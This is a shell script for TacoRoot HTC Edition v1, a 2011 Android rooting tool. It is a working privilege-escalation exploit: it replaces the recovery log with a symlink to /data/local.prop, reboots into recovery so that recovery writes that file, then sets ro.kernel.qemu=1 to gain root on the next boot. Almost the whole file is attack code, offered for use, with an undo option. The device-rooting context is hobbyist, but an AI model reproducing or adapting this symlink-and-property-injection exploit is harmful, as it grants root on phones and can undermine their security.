#!/system/bin/sh
#Copyright 2011 CunningLogic
#This file is part of TacoRoot.
#
#TacoRoot is free software: you can redistribute it and/or modify it under the terms of the 
#GNU eneral Public License as published by the Free Software Foundation, either version 3 of 
#the License, or (at your option) any later version.
#
#TacoRoot is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
#even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
#General Public License for more details.
#
#You should have received a copy of the GNU General Public License along with Foobar. If not, see
#http://www.gnu.org/licenses/gpl-3.0.txt
echo "TacoRoot: HTC Edition v1"
echo "By Justin Case (jcase)"
echo "Presented by TeamAndIRC, RootzWiki and AndroidPolice"
echo "With great assistance from Reid Holland (Erishasnobattery)"
echo "----------"
echo "TacoRoot: HTC Edition v1 is based on a vulnerability independently discovered by"
echo "both Justin Case and Dan Rosenberg (Rosenberg first). I believe unrevoked and"
echo "AlpahRev were also aware of it."
echo "----------"
echo "Usage:"
echo "--recovery : For this exploit to work, you must have booted recovery at least once after your last factory reset."
echo "--setup : Setup the phone for root, must be done before --root."
echo "--root : Root the phone."
echo "--undo : Remove TacoRoot."
echo "----------"
  case $1 in
   "--recovery")
	echo "Rebooting into recovery, please press Volume+, Volume- and Power at the same time, and reboot the system."
	reboot recovery
	break;;
   "--setup")
	echo "Rebooting into recovery, please press Volume+, Volume- and Power at the same time, and reboot the system."
	rm /data/data/recovery/log 2>&1 > /dev/null
	ln -s /data/local.prop /data/data/recovery/log 2>&1 > /dev/null
	reboot recovery
	break;;
   "--root")
	echo "Rebooting into root."
	echo "ro.kernel.qemu=1" > /data/local.prop 2>/dev/null
	reboot
	break;;
   "--undo")
	rm /data/data/recovery/log 2>&1 > /dev/null
	rm /data/local.prop  2>&1 > /dev/null
	echo "Root removed, rebooting"
	reboot
	break;;
   *)
  esac

